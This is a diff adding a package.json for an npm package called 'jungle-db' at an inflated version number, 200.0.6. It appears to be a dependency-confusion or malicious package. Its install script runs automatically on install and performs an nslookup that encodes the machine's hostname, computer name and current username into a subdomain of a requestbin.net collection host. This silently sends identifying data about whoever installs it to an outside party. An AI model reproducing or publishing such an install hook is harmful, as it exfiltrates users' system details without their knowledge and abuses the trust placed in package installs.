@@ -1,0 +1,11 @@
+{
+  "name": "jungle-db",
+  "version": "200.0.6",
+  "description": "jungle-db: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.jungle-db.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
